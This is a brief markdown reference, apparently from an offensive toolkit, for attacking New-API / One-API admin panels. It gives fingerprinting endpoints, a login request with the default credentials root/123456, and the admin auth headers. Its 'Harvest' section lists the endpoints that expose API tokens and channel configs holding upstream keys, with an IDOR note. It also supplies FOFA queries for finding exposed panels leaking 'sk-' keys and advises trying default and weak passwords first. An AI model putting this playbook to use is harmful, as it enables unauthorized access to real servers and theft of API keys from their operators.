# New-API / One-API reference

Surfaces aligned with common New-API / One-API admin panels.

## Fingerprint

| Path | Notes |
|------|-------|
| `GET /api/status` | Panel alive / version-ish JSON |
| `GET /v1/models` | OpenAI-compatible surface |

## Login

```http
POST /api/user/login
Content-Type: application/json

{"username":"root","password":"123456"}
```

Success typically includes a bearer `token` (sometimes nested under `data`) and user `id` / `role`.
Subsequent admin calls often need:

```http
Authorization: Bearer <token>
New-API-User: <user_id>
```

## Harvest

| Path | Purpose |
|------|---------|
| `GET /api/token/` | Token list |
| `GET /api/token/{id}` | IDOR / detail |
| `GET /api/channel/` | Channel configs (may embed upstream keys) |
| `GET /api/user/self` | Current user |

## FOFA

```text
body="new-api" && body="sk-"
body="new-api" && body="token"
body="one-api" && body="sk-"
body="one-api" && body="token"
body="oneapi" && body="sk-"
```

## Defaults to try first

Users: `root`, `admin`  
Passwords: product shortlist then shared `weak_passwords.txt`
